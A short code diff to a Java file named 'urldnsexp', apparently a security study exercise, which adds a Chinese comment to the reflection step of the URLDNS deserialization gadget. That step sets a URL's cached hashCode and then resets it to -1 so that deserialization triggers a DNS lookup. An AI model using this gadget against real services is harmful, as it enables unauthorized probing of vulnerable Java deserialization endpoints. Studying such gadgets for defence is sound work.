@@ -1,4 +1,3 @@
-
 package com.yutao.day7;
 
 import java.io.FileInputStream;
@@ -19,7 +18,7 @@ public class urldnsexp {
         Field field = null;
         field = clazz.getDeclaredField("hashCode");
         field.setAccessible(true);
-        field.set(url1, 123123);
+        field.set(url1, 123123);//加这句是为了防止干扰，，dns查多了就不回显了
         obj.put(url1, "qwer");
         field.set(url1, -1);
 
